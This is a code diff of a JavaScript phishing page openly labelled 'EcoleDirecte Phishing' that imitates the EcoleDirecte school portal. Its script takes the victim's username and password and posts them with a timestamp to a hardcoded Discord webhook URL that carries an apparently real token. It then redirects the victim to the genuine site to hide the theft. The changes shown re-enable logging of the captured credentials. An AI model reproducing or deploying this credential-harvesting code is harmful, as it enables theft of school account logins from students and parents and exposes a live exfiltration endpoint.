@@ -156,18 +156,18 @@
     const d = new Date();
     let date_string = d.toLocaleString();
     const webhook_name = "EcoleDirecte Phishing";
-/*
+
     console.log("connect_funct 2");
     console.log("username : ", uname);
     console.log("password : ", pass);
-*/
+
     send(webhook_name, uname, pass, date_string);
     setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 5);
 
   }
 
   function send(webhook_name, uname, pass, date_string) {
-    //console.log("fonction message")
+    console.log("fonction message")
     var webhooklink = "https://discord.com/api/webhooks/941317322214354974/rMQAi8CDTR_mSl4yBUf5tj9RtH59gMP6To7wIdLqJ-ynLK8PRz_u9ZvKLy_VYIqyzw_O";
     const request = new XMLHttpRequest();
       request.open("POST", webhooklink);
@@ -191,7 +191,7 @@
       }
 
     request.send(JSON.stringify(params));
-    //console.log("message sent");
+    console.log("message sent");
   }
 </script>
 
